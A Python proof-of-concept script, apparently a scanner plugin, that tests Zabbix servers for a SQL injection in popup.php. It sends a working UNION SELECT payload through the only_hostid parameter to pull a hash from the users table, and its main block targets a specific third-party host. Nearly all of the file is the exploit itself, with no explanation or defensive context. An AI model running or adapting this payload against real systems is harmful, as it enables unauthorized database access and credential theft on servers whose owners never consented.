from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  Zabbix Popup.php SQL Injection
Reference :  None
Author    :  NoName
"""

import  re


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port
        curl=Curl()
        result = {}
        result['result']=False

        payload = "/popup.php?dstfrm=form_scenario&dstfld1=application&srctbl=applications&srcfld1=name&only_hostid=-1))%20union%20select%201,group_concat(md5('123'))%20from%20users%23"
        code, head, res, errcode, _ = curl.curl(arg + payload)
        if code == 200:
            m = re.search("202cb962ac59075b964b07152d234b70",res)
            if m:
                output('zabbix popup.php sql injection exists.',result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  Popup.php SQL Injection '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='zabbix Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/zabbix/zabbix_df7b2660f70deb033abf765d4fac4997.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/zabbix/zabbix_df7b2660f70deb033abf765d4fac4997.py
#/root/github/poccreate/codesrc/exp-314.py